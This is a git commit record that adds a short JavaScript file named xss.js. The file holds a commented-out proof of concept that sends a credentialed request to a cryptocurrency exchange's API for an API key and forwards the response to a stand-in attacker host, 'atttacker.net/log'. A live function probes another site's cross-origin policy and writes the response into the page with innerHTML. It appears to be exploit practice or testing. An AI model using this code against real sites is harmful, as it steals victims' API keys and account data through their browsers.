f86918a8d122b2268b26c5f77dfc2f1d52152990
jvstmer <57935669+jvstmer@users.noreply.github.com>
2022-06-19 15:41:39 -0500

    a

---
+++ folder/xss.js
@@ -0,0 +1,23 @@
+/*var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://btc-exchange/api/requestApiKey',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText;
+};
+*/
+
+function cors() {
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function() {
+    if (this.status == 200) {
+      alert(this.responseText);
+      document.getElementById("report").innerHTML = this.responseText;
+    }
+  };
+  xhr.open("GET", "https://livestream.com/", true);
+  //xhttp.withCredentials = true;
+  xhr.send();
+}
